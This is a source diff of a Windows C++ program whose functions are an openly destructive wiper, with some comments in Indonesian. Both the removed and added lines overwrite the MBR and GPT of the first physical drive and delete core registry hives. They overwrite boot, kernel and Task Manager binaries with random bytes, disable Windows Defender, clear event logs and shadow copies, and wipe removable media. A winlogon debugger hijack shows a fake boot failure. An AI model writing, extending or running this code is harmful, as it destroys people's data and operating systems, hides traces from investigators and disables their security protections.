@@ -25,21 +25,6 @@
 #include <initguid.h>
 #include <virtdisk.h>
 #include <wincrypt.h>
-#include <iphlpapi.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
-#include <urlmon.h>
-#include <winhttp.h>
-#include <wininet.h>
-#include <dpapi.h>
-#include <wincrypt.h>
-#include <gdiplus.h>
-#include <random>
-#include <chrono>
-#include <atomic>
-#include <mutex>
-#include <condition_variable>
-#include <memory>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "virtdisk.lib")
@@ -51,28 +36,15 @@
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "cryptui.lib")
-#pragma comment(lib, "gdiplus.lib")
-#pragma comment(lib, "urlmon.lib")
 
-using namespace Gdiplus;
-using namespace std;
-using namespace std::chrono;
+// Konfigurasi intensitas
+const int REFRESH_RATE = 5;
+const int MAX_GLITCH_INTENSITY = 5000;
+const int GLITCH_LINES = 1000;
+const int MAX_GLITCH_BLOCKS = 500;
+const int SOUND_CHANCE = 2;
 
-// Global configuration
-const int REFRESH_RATE = 3;
-const int MAX_GLITCH_INTENSITY = 10000;
-const int GLITCH_LINES = 2000;
-const int MAX_GLITCH_BLOCKS = 1000;
-const int SOUND_CHANCE = 1;
-const int MAX_PARTICLES = 5000;
-const int MAX_CORRUPTED_TEXTS = 100;
-
-// Global variables
+// Variabel global
 HBITMAP hGlitchBitmap = NULL;
 BYTE* pPixels = NULL;
 int screenWidth, screenHeight;
@@ -84,9 +56,8 @@ bool cursorVisible = true;
 int screenShakeX = 0, screenShakeY = 0;
 bool textCorruptionActive = false;
 DWORD lastEffectTime = 0;
-ULONG_PTR gdiplusToken;
 
-// Critical mode
+// Mode destruktif
 bool criticalMode = false;
 DWORD bsodTriggerTime = 0;
 bool persistenceInstalled = false;
@@ -94,20 +65,10 @@ bool disableTaskManager = false;
 bool disableRegistryTools = false;
 bool fileCorruptionActive = false;
 bool processKillerActive = false;
-bool g_isAdmin = false;
+bool g_isAdmin = false;  // Admin mode flag
 bool destructiveActionsTriggered = false;
-bool networkPropagationActive = false;
-bool encryptionActive = false;
-bool biosCorruptionActive = false;
 
-// Advanced effects
-bool matrixRainActive = false;
-bool fractalNoiseActive = false;
-bool screenBurnActive = false;
-bool wormholeEffectActive = false;
-bool temporalDistortionActive = false;
-
-// Particle system
+// Struktur untuk efek partikel
 struct Particle {
     float x, y;
     float vx, vy;
@@ -115,105 +76,19 @@ struct Particle {
     DWORD maxLife;
     COLORREF color;
     int size;
-    int type;
-    float rotation;
-    float rotationSpeed;
 };
 
-// Corrupted text
+// Struktur untuk efek teks korup
 struct CorruptedText {
     int x, y;
     std::wstring text;
     DWORD creationTime;
-    float opacity;
-    float driftX, driftY;
 };
 
-// Matrix rain
-struct MatrixStream {
-    int x;
-    int y;
-    int length;
-    int speed;
-    DWORD lastUpdate;
-    std::wstring symbols;
-};
-
-// Advanced structures
-struct FractalPoint {
-    float x, y;
-    float vx, vy;
-    COLORREF color;
-};
-
-struct Wormhole {
-    float centerX, centerY;
-    float radius;
-    float strength;
-    DWORD creationTime;
-};
-
-// Containers
 std::vector<Particle> particles;
 std::vector<CorruptedText> corruptedTexts;
-std::vector<MatrixStream> matrixStreams;
-std::vector<FractalPoint> fractalPoints;
-std::vector<Wormhole> wormholes;
-std::mutex g_mutex;
 
-// Random number generation
-std::random_device rd;
-std::mt19937 gen(rd());
-std::uniform_int_distribution<> dis(0, 255);
-std::uniform_real_distribution<> disf(0.0, 1.0);
-
-// Forward declarations
-BOOL IsRunAsAdmin();
-void DestroyMBR();
-void DestroyGPT();
-void DestroyRegistry();
-void DisableCtrlAltDel();
-void SetCriticalProcess();
-void BreakTaskManager();
-void KillCriticalProcesses();
-void ClearEventLogs();
-void ClearShadowCopies();
-void WipeRemovableMedia();
-void CorruptBootFiles();
-void CorruptKernelFiles();
-void DisableWindowsDefender();
-void SetCustomBootFailure();
-void WipeAllDrives();
-void EncryptUserFiles();
-void CorruptBIOS();
-void PropagateNetwork();
-void ExecuteDestructiveActions();
-void PlayGlitchSoundAsync();
-void CaptureScreen(HWND hwnd);
-void ApplyColorShift(BYTE* pixels, int shift);
-void ApplyScreenShake();
-void ApplyCursorEffect();
-void UpdateParticles();
-void ApplyMeltingEffect(BYTE* originalPixels);
-void ApplyTextCorruption();
-void ApplyPixelSorting();
-void ApplyStaticBars();
-void ApplyInversionWaves();
-void ApplyMatrixRain();
-void ApplyFractalNoise();
-void ApplyScreenBurn();
-void ApplyWormholeEffect();
-void ApplyTemporalDistortion();
-void ApplyGlitchEffect();
-void OpenRandomPopups();
-void InstallPersistence();
-void DisableSystemTools();
-void CorruptSystemFiles();
-void TriggerBSOD();
-void RunBackgroundProcess();
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
-
-// ======== ENHANCED ADMIN DESTRUCTIVE FUNCTIONS ========
+// ======== FUNGSI ADMIN DESTRUCTIVE ========
 BOOL IsRunAsAdmin() {
     BOOL fIsRunAsAdmin = FALSE;
     PSID pAdministratorsGroup = NULL;
@@ -230,16 +105,18 @@ void DestroyMBR() {
     HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDrive == INVALID_HANDLE_VALUE) return;
 
-    // Overwrite first 2048 sectors (1MB)
-    const DWORD bufferSize = 512 * 2048;
-    std::unique_ptr<BYTE[]> garbageBuffer(new BYTE[bufferSize]);
+    // Overwrite first 100 sectors (50KB)
+    const DWORD bufferSize = 512 * 100;
+    BYTE* garbageBuffer = new BYTE[bufferSize];
     for (DWORD i = 0; i < bufferSize; i++) {
-        garbageBuffer[i] = static_cast<BYTE>(dis(gen));
+        garbageBuffer[i] = static_cast<BYTE>(rand() % 256);
     }
 
     DWORD bytesWritten;
-    WriteFile(hDrive, garbageBuffer.get(), bufferSize, &bytesWritten, NULL);
+    WriteFile(hDrive, garbageBuffer, bufferSize, &bytesWritten, NULL);
     FlushFileBuffers(hDrive);
+
+    delete[] garbageBuffer;
     CloseHandle(hDrive);
 }
 
@@ -247,87 +124,51 @@ void DestroyGPT() {
     HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDrive == INVALID_HANDLE_VALUE) return;
 
-    // Overwrite GPT header at LBA 1 and backup at last LBA
+    // Overwrite GPT header at LBA 1
     const int gptHeaderSize = 512;
-    std::unique_ptr<BYTE[]> gptGarbage(new BYTE[gptHeaderSize]);
+    BYTE* gptGarbage = new BYTE[gptHeaderSize];
     for (int i = 0; i < gptHeaderSize; i++) {
-        gptGarbage[i] = static_cast<BYTE>(dis(gen));
+        gptGarbage[i] = static_cast<BYTE>(rand() % 256);
     }
 
     DWORD bytesWritten;
     LARGE_INTEGER offset;
-    
-    // Primary GPT header
-    offset.QuadPart = 512;
+    offset.QuadPart = 512;  // LBA 1
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-    WriteFile(hDrive, gptGarbage.get(), gptHeaderSize, &bytesWritten, NULL);
+    WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
 
-    // Get disk size for backup GPT header
-    DISK_GEOMETRY_EX dg = {0};
-    DWORD bytesReturned = 0;
-    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
-        // Backup GPT header at last LBA
-        offset.QuadPart = dg.DiskSize.QuadPart - 512;
-        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-        WriteFile(hDrive, gptGarbage.get(), gptHeaderSize, &bytesWritten, NULL);
-    }
-
-    // Overwrite partition entries (more comprehensive)
-    const DWORD partitionEntriesSize = 512 * 256;
-    std::unique_ptr<BYTE[]> partitionGarbage(new BYTE[partitionEntriesSize]);
+    // Overwrite partition entries
+    const DWORD partitionEntriesSize = 512 * 128;  // 128 sectors
+    BYTE* partitionGarbage = new BYTE[partitionEntriesSize];
     for (DWORD i = 0; i < partitionEntriesSize; i++) {
-        partitionGarbage[i] = static_cast<BYTE>(dis(gen));
+        partitionGarbage[i] = static_cast<BYTE>(rand() % 256);
     }
 
-    // Primary partition entries
-    offset.QuadPart = 512 * 2;
+    offset.QuadPart = 512 * 2;  // LBA 2
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-    WriteFile(hDrive, partitionGarbage.get(), partitionEntriesSize, &bytesWritten, NULL);
-
-    // Backup partition entries
-    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
-        offset.QuadPart = dg.DiskSize.QuadPart - 512 - partitionEntriesSize;
-        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
-        WriteFile(hDrive, partitionGarbage.get(), partitionEntriesSize, &bytesWritten, NULL);
-    }
+    WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
 
     FlushFileBuffers(hDrive);
+
+    delete[] gptGarbage;
+    delete[] partitionGarbage;
     CloseHandle(hDrive);
 }
 
 void DestroyRegistry() {
     const wchar_t* registryKeys[] = {
-        L"HKEY_LOCAL_MACHINE\\SOFTWARE",
-        L"HKEY_LOCAL_MACHINE\\SYSTEM",
-        L"HKEY_LOCAL_MACHINE\\SAM",
-        L"HKEY_LOCAL_MACHINE\\SECURITY",
-        L"HKEY_LOCAL_MACHINE\\HARDWARE",
-        L"HKEY_CURRENT_USER\\Software",
-        L"HKEY_CURRENT_USER\\System",
-        L"HKEY_USERS\\.DEFAULT",
-        L"HKEY_CLASSES_ROOT",
-        L"HKEY_CURRENT_CONFIG"
+        L"SOFTWARE",
+        L"SYSTEM",
+        L"SAM",
+        L"SECURITY",
+        L"HARDWARE"
     };
 
+    HKEY hRoot = HKEY_LOCAL_MACHINE;
+    
     for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
         HKEY hKey;
-        wchar_t subKey[256];
-        wchar_t rootKey[256];
-        
-        // Split registry path
-        wchar_t* context = NULL;
-        wcscpy_s(rootKey, 256, wcstok_s((wchar_t*)registryKeys[i], L"\\", &context));
-        wcscpy_s(subKey, 256, context);
-        
-        HKEY hRoot;
-        if (wcscmp(rootKey, L"HKEY_LOCAL_MACHINE") == 0) hRoot = HKEY_LOCAL_MACHINE;
-        else if (wcscmp(rootKey, L"HKEY_CURRENT_USER") == 0) hRoot = HKEY_CURRENT_USER;
-        else if (wcscmp(rootKey, L"HKEY_USERS") == 0) hRoot = HKEY_USERS;
-        else if (wcscmp(rootKey, L"HKEY_CLASSES_ROOT") == 0) hRoot = HKEY_CLASSES_ROOT;
-        else if (wcscmp(rootKey, L"HKEY_CURRENT_CONFIG") == 0) hRoot = HKEY_CURRENT_CONFIG;
-        else continue;
-        
-        if (RegOpenKeyExW(hRoot, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+        if (RegOpenKeyExW(hRoot, registryKeys[i], 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
             // Delete all values
             wchar_t valueName[16383];
             DWORD valueNameSize;
@@ -339,7 +180,7 @@ void DestroyRegistry() {
                 RegDeleteValueW(hKey, valueName);
             }
             
-            // Delete all subkeys recursively
+            // Delete all subkeys
             wchar_t subkeyName[256];
             DWORD subkeyNameSize;
             
@@ -347,23 +188,22 @@ void DestroyRegistry() {
                 subkeyNameSize = 256;
                 if (RegEnumKeyExW(hKey, 0, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                 
-                // Recursive deletion
                 HKEY hSubKey;
                 if (RegOpenKeyExW(hKey, subkeyName, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS) {
-                    // Delete all values in subkey
-                    wchar_t subValueName[16383];
-                    DWORD subValueNameSize;
-                    DWORD jValue = 0;
+                    // Recursively delete subkeys
+                    wchar_t subsubkeyName[256];
+                    DWORD subsubkeyNameSize;
                     
                     while (1) {
-                        subValueNameSize = 16383;
-                        if (RegEnumValueW(hSubKey, jValue, subValueName, &subValueNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
-                        RegDeleteValueW(hSubKey, subValueName);
+                        subsubkeyNameSize = 256;
+                        if (RegEnumKeyExW(hSubKey, 0, subsubkeyName, &subsubkeyNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
+                        RegDeleteTreeW(hSubKey, subsubkeyName);
                     }
+                    
                     RegCloseKey(hSubKey);
                 }
                 
-                RegDeleteTreeW(hKey, subkeyName);
+                RegDeleteKeyW(hKey, subkeyName);
             }
             
             RegCloseKey(hKey);
@@ -414,15 +254,13 @@ void SetCriticalProcess() {
     }
 }
 
+void KillCriticalProcesses();
+
 void BreakTaskManager() {
-    // Corrupt taskmgr.exe and related files
+    // Corrupt taskmgr.exe
     const wchar_t* taskmgrPaths[] = {
         L"C:\\Windows\\System32\\taskmgr.exe",
-        L"C:\\Windows\\SysWOW64\\taskmgr.exe",
-        L"C:\\Windows\\System32\\Taskmgr.exe.mui",
-        L"C:\\Windows\\SysWOW64\\Taskmgr.exe.mui",
-        L"C:\\Windows\\System32\\en-US\\taskmgr.exe.mui",
-        L"C:\\Windows\\SysWOW64\\en-US\\taskmgr.exe.mui"
+        L"C:\\Windows\\SysWOW64\\taskmgr.exe"
     };
 
     for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
@@ -430,13 +268,14 @@ void BreakTaskManager() {
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
             if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
+                BYTE* buffer = new BYTE[fileSize];
                 if (buffer) {
                     for (DWORD j = 0; j < fileSize; j++) {
-                        buffer[j] = static_cast<BYTE>(dis(gen));
+                        buffer[j] = static_cast<BYTE>(rand() % 256);
                     }
                     DWORD written;
-                    WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
+                    WriteFile(hFile, buffer, fileSize, &written, NULL);
+                    delete[] buffer;
                 }
             }
             CloseHandle(hFile);
@@ -447,15 +286,14 @@ void BreakTaskManager() {
     KillCriticalProcesses();
 }
 
-// ============== ENHANCED DESTRUCTIVE FEATURES ==============
+// ============== DESTRUCTIVE FEATURES ==============
 void ClearEventLogs() {
     const wchar_t* logs[] = {
         L"Application", L"Security", L"System", L"Setup", 
-        L"ForwardedEvents", L"HardwareEvents", L"Internet Explorer",
-        L"Windows PowerShell", L"Microsoft-Windows-Windows Defender/Operational"
+        L"ForwardedEvents", L"HardwareEvents"
     };
     
-    for (int i = 0; i < sizeof(logs)/sizeof(logs[0]); i++) {
+    for (size_t i = 0; i < sizeof(logs)/sizeof(logs[0]); i++) {
         wchar_t command[256];
         wsprintfW(command, L"wevtutil cl \"%s\"", logs[i]);
         
@@ -480,22 +318,13 @@ void ClearShadowCopies() {
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
     }
-    
-    // Also try with wmic
-    CreateProcessW(NULL, L"wmic shadowcopy delete", 
-                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    if (pi.hProcess) {
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
 }
 
 void WipeRemovableMedia() {
     const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
-    std::unique_ptr<BYTE[]> wipeBuffer(new BYTE[BUFFER_SIZE]);
+    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
     for (int i = 0; i < BUFFER_SIZE; i++) {
-        wipeBuffer[i] = static_cast<BYTE>(dis(gen));
+        wipeBuffer[i] = static_cast<BYTE>(rand() % 256);
     }
 
     wchar_t drives[128];
@@ -504,7 +333,7 @@ void WipeRemovableMedia() {
     
     while (*drive) {
         UINT type = GetDriveTypeW(drive);
-        if (type == DRIVE_REMOVABLE || type == DRIVE_CDROM || type == DRIVE_REMOTE) {
+        if (type == DRIVE_REMOVABLE || type == DRIVE_CDROM) {
             wchar_t devicePath[50];
             wsprintfW(devicePath, L"\\\\.\\%c:", drive[0]);
             
@@ -522,10 +351,10 @@ void WipeRemovableMedia() {
                     
                     while (totalWritten.QuadPart < diskSize.QuadPart) {
                         DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
-                            ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
+                            ? BUFFER_SIZE : static_cast<DWORD>(diskSize.QuadPart - totalWritten.QuadPart);
                         
                         DWORD bytesWritten;
-                        WriteFile(hDevice, wipeBuffer.get(), bytesToWrite, &bytesWritten, NULL);
+                        WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
                         totalWritten.QuadPart += bytesWritten;
                     }
                 }
@@ -534,36 +363,31 @@ void WipeRemovableMedia() {
         }
         drive += wcslen(drive) + 1;
     }
+    
+    delete[] wipeBuffer;
 }
 
 void CorruptBootFiles() {
     const wchar_t* bootFiles[] = {
         L"C:\\Windows\\Boot\\PCAT\\bootmgr",
-        L"C:\\Windows\\Boot\\EFI\\bootmgfw.efi",
         L"C:\\Windows\\System32\\winload.exe",
-        L"C:\\Windows\\System32\\winload.efi",
         L"C:\\Windows\\System32\\winresume.exe",
-        L"C:\\Windows\\System32\\winresume.efi",
         L"C:\\Windows\\System32\\bootres.dll",
-        L"C:\\Windows\\System32\\Boot\\bootres.dll",
-        L"C:\\Windows\\System32\\config\\SYSTEM",
-        L"C:\\Windows\\System32\\config\\SOFTWARE",
-        L"C:\\Windows\\System32\\config\\SECURITY",
-        L"C:\\Windows\\System32\\config\\SAM",
-        L"C:\\Windows\\System32\\config\\DEFAULT"
+        L"C:\\Windows\\System32\\Boot\\bootres.dll"
     };
 
-    for (int i = 0; i < sizeof(bootFiles)/sizeof(bootFiles[0]); i++) {
+    for (size_t i = 0; i < sizeof(bootFiles)/sizeof(bootFiles[0]); i++) {
         HANDLE hFile = CreateFileW(bootFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
             if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
+                BYTE* buffer = new BYTE[fileSize];
                 for (DWORD j = 0; j < fileSize; j++) {
-                    buffer[j] = static_cast<BYTE>(dis(gen));
+                    buffer[j] = static_cast<BYTE>(rand() % 256);
                 }
                 DWORD written;
-                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
+                WriteFile(hFile, buffer, fileSize, &written, NULL);
+                delete[] buffer;
             }
             CloseHandle(hFile);
         }
@@ -573,58 +397,25 @@ void CorruptBootFiles() {
 void CorruptKernelFiles() {
     const wchar_t* kernelFiles[] = {
         L"C:\\Windows\\System32\\ntoskrnl.exe",
-        L"C:\\Windows\\System32\\ntkrnlpa.exe",
         L"C:\\Windows\\System32\\hal.dll",
         L"C:\\Windows\\System32\\kdcom.dll",
-        L"C:\\Windows\\System32\\ci.dll",
-        L"C:\\Windows\\System32\\drivers\\*.sys",
-        L"C:\\Windows\\System32\\drivers\\etc\\hosts",
-        L"C:\\Windows\\System32\\drivers\\etc\\networks"
+        L"C:\\Windows\\System32\\ci.dll"
     };
 
-    for (int i = 0; i < sizeof(kernelFiles)/sizeof(kernelFiles[0]); i++) {
-        // Handle wildcards
-        if (wcschr(kernelFiles[i], L'*') != NULL) {
-            WIN32_FIND_DATAW fd;
-            HANDLE hFind = FindFirstFileW(kernelFiles[i], &fd);
-            if (hFind != INVALID_HANDLE_VALUE) {
-                do {
-                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                        wchar_t filePath[MAX_PATH];
-                        wcscpy_s(filePath, MAX_PATH, L"C:\\Windows\\System32\\drivers\\");
-                        wcscat_s(filePath, MAX_PATH, fd.cFileName);
-                        
-                        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-                        if (hFile != INVALID_HANDLE_VALUE) {
-                            DWORD fileSize = GetFileSize(hFile, NULL);
-                            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                                std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
-                                for (DWORD j = 0; j < fileSize; j++) {
-                                    buffer[j] = static_cast<BYTE>(dis(gen));
-                                }
-                                DWORD written;
-                                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
-                            }
-                            CloseHandle(hFile);
-                        }
-                    }
-                } while (FindNextFileW(hFind, &fd));
-                FindClose(hFind);
-            }
-        } else {
-            HANDLE hFile = CreateFileW(kernelFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-            if (hFile != INVALID_HANDLE_VALUE) {
-                DWORD fileSize = GetFileSize(hFile, NULL);
-                if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                    std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
-                    for (DWORD j = 0; j < fileSize; j++) {
-                        buffer[j] = static_cast<BYTE>(dis(gen));
-                    }
-                    DWORD written;
-                    WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
+    for (size_t i = 0; i < sizeof(kernelFiles)/sizeof(kernelFiles[0]); i++) {
+        HANDLE hFile = CreateFileW(kernelFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD fileSize = GetFileSize(hFile, NULL);
+            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+                BYTE* buffer = new BYTE[fileSize];
+                for (DWORD j = 0; j < fileSize; j++) {
+                    buffer[j] = static_cast<BYTE>(rand() % 256);
                 }
-                CloseHandle(hFile);
+                DWORD written;
+                WriteFile(hFile, buffer, fileSize, &written, NULL);
+                delete[] buffer;
             }
+            CloseHandle(hFile);
         }
     }
 }
@@ -634,22 +425,14 @@ void DisableWindowsDefender() {
     SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (scm) {
         const wchar_t* services[] = {
-            L"WinDefend", L"WdNisSvc", L"SecurityHealthService", L"wscsvc",
-            L"MsMpSvc", L"mpssvc", L"Sense", L"SgrmAgent", L"SgrmBroker"
+            L"WinDefend", L"WdNisSvc", L"SecurityHealthService", L"wscsvc"
         };
         
-        for (int i = 0; i < sizeof(services)/sizeof(services[0]); i++) {
+        for (size_t i = 0; i < sizeof(services)/sizeof(services[0]); i++) {
             SC_HANDLE service = OpenServiceW(scm, services[i], SERVICE_ALL_ACCESS);
             if (service) {
                 SERVICE_STATUS status;
                 ControlService(service, SERVICE_CONTROL_STOP, &status);
-                
-                // Disable service
-                SERVICE_CONFIG config;
-                DWORD bytesNeeded;
-                QueryServiceConfig(service, &config, sizeof(config), &bytesNeeded);
-                ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
-                                  SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                 CloseServiceHandle(service);
             }
         }
@@ -664,7 +447,6 @@ void DisableWindowsDefender() {
         DWORD disable = 1;
         RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableRoutinelyTakingAction", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegCloseKey(hKey);
     }
 
@@ -677,38 +459,46 @@ void DisableWindowsDefender() {
         RegSetValueExW(hKey, L"DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegSetValueExW(hKey, L"DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegSetValueExW(hKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegCloseKey(hKey);
     }
 
     // Layer 4: Disable scheduled tasks
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    const wchar_t* tasks[] = {
-        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance",
-        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",
-        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
-        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification",
-        L"Microsoft\\Windows\\Windows Defender\\Windows Defender Heartbeat"
-    };
+    CreateProcessW(NULL, 
+        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /DISABLE",
+        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (pi.hProcess) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
     
-    for (int i = 0; i < sizeof(tasks)/sizeof(tasks[0]); i++) {
-        wchar_t command[512];
-        wsprintfW(command, L"schtasks /Change /TN \"%s\" /DISABLE", tasks[i]);
-        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        if (pi.hProcess) {
-            WaitForSingleObject(pi.hProcess, 2000);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-        }
-        
-        wsprintfW(command, L"schtasks /Delete /TN \"%s\" /F", tasks[i]);
-        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        if (pi.hProcess) {
-            WaitForSingleObject(pi.hProcess, 2000);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-        }
+    CreateProcessW(NULL, 
+        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /DISABLE",
+        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (pi.hProcess) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    
+    CreateProcessW(NULL, 
+        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /DISABLE",
+        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (pi.hProcess) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    
+    CreateProcessW(NULL, 
+        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /DISABLE",
+        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (pi.hProcess) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
     }
 }
 
@@ -720,24 +510,10 @@ void SetCustomBootFailure() {
         
         HKEY subKey;
         if (RegCreateKeyExW(hKey, L"winlogon.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &subKey, NULL) == ERROR_SUCCESS) {
-            wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && echo Bootloader corrupted && echo System integrity compromised && echo Contact administrator && pause\"";
+            wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && echo Bootloader corrupted && pause\"";
             RegSetValueExW(subKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (wcslen(debugger) + 1) * sizeof(wchar_t));
             RegCloseKey(subKey);
         }
-        
-        // Target more critical processes
-        const wchar_t* processes[] = {
-            L"lsass.exe", L"services.exe", L"svchost.exe", L"csrss.exe", L"wininit.exe"
-        };
-        
-        for (int i = 0; i < sizeof(processes)/sizeof(processes[0]); i++) {
-            if (RegCreateKeyExW(hKey, processes[i], 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &subKey, NULL) == ERROR_SUCCESS) {
-                wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && shutdown -r -t 0\"";
-                RegSetValueExW(subKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (wcslen(debugger) + 1) * sizeof(wchar_t));
-                RegCloseKey(subKey);
-            }
-        }
-        
         RegCloseKey(hKey);
     }
 
@@ -746,7 +522,7 @@ void SetCustomBootFailure() {
         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         wchar_t caption[] = L"CRITICAL SYSTEM FAILURE";
-        wchar_t message[] = L"Bootloader corrupted. System integrity compromised. Contact administrator.\n\nAll data may be lost. Do not power off the system.";
+        wchar_t message[] = L"Bootloader corrupted. System integrity compromised. Contact administrator.";
